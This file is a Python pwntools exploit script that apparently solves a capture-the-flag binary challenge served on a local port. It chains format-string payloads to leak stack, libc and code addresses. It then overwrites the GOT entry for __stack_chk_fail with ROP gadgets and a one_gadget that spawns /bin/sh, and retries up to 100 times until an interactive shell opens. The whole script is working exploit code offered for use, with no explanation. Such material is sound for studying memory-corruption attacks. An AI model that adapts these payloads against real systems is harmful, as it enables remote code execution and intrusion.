from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

count = 0
while count < 100:
    r = remote('127.0.0.1', 13372)
    # r = process('./chal')
    # gdb.attach(r)
    try:
        info(f'Round : {count}')
        count += 1

        rbp_guess = 0xd0


        # ========= main (#1) =========
        # get rbp, libc, codebase
        r.send(b'%63c%10$hhn.%10$p.%21$p.%25$p'.ljust(0x20, b'z') + bytes([rbp_guess + 8]))

        r.recvuntil(b'.')
        [addr1, addr2, addr3] = r.recvuntil(b'z')[:-1].decode().split('.')
        r.recvuntil(bytes([rbp_guess + 8]))
        r.recv(5)


        # ========= address =========
        rbp = int(addr1, base=16) - 8
        libc = int(addr2, base=16) - 0x024083
        codebase = int(addr3, base=16) - 0x0011a9
        info(f'rbp : {hex(rbp)}')
        info(f'libc : {hex(libc)}')
        info(f'codebase : {hex(codebase)}')

        # 0xe3b01 execve("/bin/sh", r15, rdx)
        # constraints:
        #   [r15] == NULL || r15 == NULL
        #   [rdx] == NULL || rdx == NULL
        one_gad = libc + 0xe3b01
        __stack_chk_fail_got = codebase + 0x4018
        pop_rdx_ret = libc + 0x0000000000142c92
        pop_rdx_r12_ret = libc + 0x0000000000119211


        # ========= main (#2 - #7) =========
        # write gadget(pop_rdx_r12_ret) to __stack_chk_fail's got
        for i in range(6):
            # r.recvline()
            num = ((pop_rdx_r12_ret >> i * 8) - 63) & 0xff
            payload = b'%63c%10$hhn%' + str(num).encode() + b'c%9$hhn'
            payload = payload.ljust(0x18, b'z') + p64(__stack_chk_fail_got + i) + bytes([(rbp + 8) & 0xff])
            r.send(payload)
            r.recvuntil(p64(__stack_chk_fail_got + i)[:1])
            r.recv(5)


        # ========= main (#8) =========
        # r.recvline()
        payload = b'a%10$hhn' + flat(pop_rdx_ret, 0, one_gad) + bytes([(rbp - 8) & 0xff])
        r.send(payload)
        r.recv(7)

        r.interactive()
        break
    except EOFError:
        pass

    r.close()